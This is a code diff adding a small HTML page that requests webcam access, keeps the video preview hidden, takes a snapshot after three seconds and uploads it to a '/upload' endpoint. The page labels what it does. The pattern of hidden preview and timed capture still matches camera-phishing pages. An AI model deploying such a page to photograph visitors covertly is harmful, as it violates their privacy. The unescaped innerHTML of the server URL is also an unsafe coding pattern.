@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Auto Capture Upload</title>
+  <style>
+    body { background: #111; color: #fff; text-align: center; padding: 50px; }
+    video, canvas { display: none; }
+    a { color: #0f0; margin-top: 20px; display: block; }
+  </style>
+</head>
+<body>
+  <h1>📸 Auto Capture & Upload</h1>
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
+  <p id="status">Mengambil foto...</p>
+  <div id="url"></div>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const status = document.getElementById('status');
+    const urlBox = document.getElementById('url');
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        video.onloadedmetadata = () => {
+          video.play();
+          setTimeout(captureAndUpload, 3000);
+        };
+      })
+      .catch(() => status.innerText = "❌ Kamera tidak diizinkan");
+
+    function captureAndUpload() {
+      const ctx = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const imageData = canvas.toDataURL('image/jpeg');
+
+      fetch('/upload', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ image: imageData })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.status) {
+          status.innerText = "✅ Foto berhasil di-upload!";
+          urlBox.innerHTML = `<a href="${data.url}" target="_blank">${data.url}</a>`;
+        } else {
+          status.innerText = "❌ Gagal upload";
+        }
+        stopCamera();
+      });
+    }
+
+    function stopCamera() {
+      const stream = video.srcObject;
+      stream.getTracks().forEach(track => track.stop());
+      video.srcObject = null;
+    }
+  </script>
+</body>
+</html>
